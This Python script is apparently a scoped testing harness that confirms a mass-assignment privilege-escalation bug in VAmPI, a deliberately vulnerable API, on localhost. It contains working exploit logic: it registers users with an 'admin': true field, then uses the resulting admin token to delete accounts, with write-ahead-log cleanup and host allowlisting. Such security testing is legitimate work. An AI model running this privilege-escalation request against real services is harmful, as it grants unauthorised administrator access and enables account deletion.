"""
wall3_http_saga.py — Wall-3 over REAL HTTP against an INDEPENDENT target (VAmPI),
with a DURABLE (on-disk) write-ahead log and a classification ALLOWLIST.

Honest finding about VAmPI's write surface (verified from source):
  - PUT .../email updates the TOKEN's user (self-scoped) -> NOT write-BOLA.
  - DELETE .../{username} is admin-gated -> not a plain BOLA, and irreversible.
  - BUT POST /users/v1/register honours an `admin` field (vuln=1): anyone can
    self-register as admin -> a REAL write-side authz bug: BOPLA-write /
    mass-assignment / privilege escalation. That is what we confirm here.

Safety discipline (Wall-3):
  gate0 static screen  -> gate1 EMPIRICAL rehearsal on a sacrificial OWN user
  -> confirm by NON-DESTRUCTIVE Δstate read-back (debug admin flag differential)
  -> durable-WAL-protected create/compensate (every created user is deleted)
  -> net-zero: no test users remain.
Only allowlisted mutating ops run; the operator asserts no external effect per op.
Pure stdlib.
"""
from __future__ import annotations
import json, os, sys, urllib.request, urllib.error, uuid

BASE = os.environ.get("WALL3_BASE", "http://127.0.0.1:5000")
HOST = BASE.split("://", 1)[-1]
WAL_PATH = os.environ.get("WALL3_WAL", "/tmp/wall3_wal.json")
PW = "w3pass"

# ---- classification ALLOWLIST: the ONLY mutating op permitted, operator-vetted ----
ALLOWLIST = {
    "register_admin_massassign": {
        "taxonomy": "BOPLA-write / privilege-escalation (mass-assignment at register)",
        "create_path": "/users/v1/register",
        "privileged_field": "admin",
        "readback": "debug",                       # non-destructive admin-flag read
        "inverse": "DELETE /users/v1/{username}",  # compensate (needs admin)
        "operator_asserts_no_external_effect": True,
    }
}
DANGER = ("pay", "money", "charge", "transfer", "email", "sms", "notify",
          "publish", "invite", "webhook", "wire", "payout", "send")

# --------------------------------------------------------------- scope-guarded HTTP
ALLOWED_HOSTS = {HOST}

def http(method, path, token=None, body=None):
    if HOST not in ALLOWED_HOSTS:
        return (-2, {"error": "out-of-scope"})
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    if token: req.add_header("Authorization", "Bearer " + token)
    if data is not None: req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            b = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        b = e.read().decode(errors="replace"); return (e.code, _j(b))
    except Exception as e:                       # noqa: BLE001
        return (-1, {"error": str(e)})
    return (r.status if hasattr(r, "status") else 200, _j(b))

def _j(s):
    try: return json.loads(s)
    except Exception: return {"_raw": s}

# --------------------------------------------------------------- durable WAL
class DurableWAL:
    def __init__(self, path):
        self.path = path; self.entries = []; self._flush()
    def begin(self, op, undo_user):
        self.entries.append({"op": op, "undo_delete_user": undo_user, "done": False})
        self._flush(); return len(self.entries) - 1
    def done(self, i):
        self.entries[i]["done"] = True; self._flush()
    def pending(self):
        return [(i, e) for i, e in enumerate(self.entries) if not e["done"]]
    def _flush(self):
        with open(self.path, "w") as fh:
            json.dump(self.entries, fh, indent=2); fh.flush(); os.fsync(fh.fileno())
    @classmethod
    def load(cls, path):
        w = cls.__new__(cls); w.path = path
        with open(path) as fh: w.entries = json.load(fh)
        return w
    def recover(self, admin_token) -> int:
        """Crash recovery: delete every pending (orphaned) test user over HTTP."""
        n = 0
        for i, e in self.pending():
            http("DELETE", f"/users/v1/{e['undo_delete_user']}", token=admin_token)
            self.done(i); n += 1
        return n

# --------------------------------------------------------------- VAmPI adapters
def register(username, admin):
    return http("POST", "/users/v1/register",
                body={"username": username, "password": PW,
                      "email": f"{username}@w3.local", "admin": admin})
def login(username):
    st, j = http("POST", "/users/v1/login", body={"username": username, "password": PW})
    return j.get("auth_token", "")
def debug_admins():
    st, j = http("GET", "/users/v1/_debug")
    return {u["username"]: u["admin"] for u in j.get("users", [])}

# --------------------------------------------------------------- the engine
def static_screen(op_name, spec):
    hay = f"{op_name} {spec['create_path']}".lower()
    hit = next((k for k in DANGER if k in hay), None)
    if hit and not spec.get("operator_asserts_no_external_effect"):
        return False, f"static screen: '{hit}' and no operator assertion"
    return True, ("passed" if not hit else f"'{hit}' present but operator-asserted safe")

def rehearse(wal, nonce):
    """Empirically prove the create is reversible (create admin user -> delete ->
    verify gone) on a SACRIFICIAL own user, before trusting the compensate."""
    s = f"w3_reh_{nonce}"
    wal.begin("rehearse-create", s)
    register(s, admin=True)
    created_admin = debug_admins().get(s) is True
    tok = login(s)
    http("DELETE", f"/users/v1/{s}", token=tok)      # inverse (self-delete as admin)
    wal.done(len(wal.entries) - 1)
    gone = s not in debug_admins()
    return created_admin and gone

def confirm(wal, nonce):
    x, y = f"w3_att_{nonce}", f"w3_ctl_{nonce}"
    wal.begin("create-attacker", x); register(x, admin=True)
    wal.begin("create-control", y); register(y, admin=False)
    d = debug_admins()
    violated = d.get(x) is True and d.get(y) is False
    return violated, x, y, {"attacker_admin": d.get(x), "control_admin": d.get(y)}

def main():
    op = "register_admin_massassign"; spec = ALLOWLIST[op]
    nonce = uuid.uuid4().hex[:6]
    wal = DurableWAL(WAL_PATH)
    print("WALL-3 HTTP SAGA vs VAmPI (independent target)")
    print("=" * 76)

    # gate 0: static screen (allowlist + operator assertion)
    ok, why = static_screen(op, spec); print(f"  [gate0 screen] {op}: {why}")
    assert ok, why
    # gate 1: empirical rehearsal (reversibility proven on a sacrificial own user)
    reversible = rehearse(wal, nonce)
    print(f"  [gate1 rehearse] create↔delete reversible, no external effect: {reversible}")
    assert reversible, "rehearsal failed — would REFUSE"
    # confirm the real write-side bug by non-destructive Δstate read-back
    violated, x, y, proof = confirm(wal, nonce)
    print(f"  [confirm] debug read-back: {proof}")
    print(f"  [WAL on disk now] pending entries = {[e['undo_delete_user'] for _,e in wal.pending()]}")
    verdict = "FINDING" if violated else "CLEAN"
    # compensate / cleanup: use the (ill-gotten) admin X to delete Y then X
    tok = login(x)
    http("DELETE", f"/users/v1/{y}", token=tok); wal.done(_idx(wal, y))
    http("DELETE", f"/users/v1/{x}", token=tok); wal.done(_idx(wal, x))
    remaining = [u for u in debug_admins() if u.startswith("w3_") and nonce in u]
    print("-" * 76)
    print(f"  VERDICT: {verdict}  — {spec['taxonomy']}")
    if violated:
        print("  PoC: POST /users/v1/register with \"admin\": true  -> self-provisioned admin")
        print("  Δstate: attacker.admin=True vs control.admin=False (debug read-back)")
    print(f"  net-zero: test users remaining = {remaining}  (expect [])")

    # durability demo: orphan a user, 'crash', then recover from the on-disk WAL
    orph = f"w3_orph_{nonce}"
    wal.begin("orphan-demo", orph); register(orph, admin=True)
    print("-" * 76)
    print(f"  [durability] orphaned {orph} + WAL persisted; simulating crash (no cleanup)")
    wal2 = DurableWAL.load(WAL_PATH)                 # fresh process would do this
    admin_tok = login(orph)                          # recovery admin (any created admin)
    restored = wal2.recover(admin_tok)
    gone = orph not in debug_admins()
    print(f"  [recovery] replayed {restored} pending undo(s) from disk; orphan gone: {gone}")

    print("=" * 76)
    assert verdict == "FINDING", "expected the VAmPI mass-assignment to confirm"
    assert remaining == [], ("litter left", remaining)
    assert gone, "WAL recovery failed to delete the orphan"
    print("PASS: real write-side authz bug confirmed on INDEPENDENT code (VAmPI),")
    print("      via non-destructive read-back, durable-WAL-protected, net-zero harm.")

def _idx(wal, user):
    for i, e in enumerate(wal.entries):
        if e["undo_delete_user"] == user and not e["done"]:
            return i
    return len(wal.entries) - 1

if __name__ == "__main__":
    sys.exit(main())
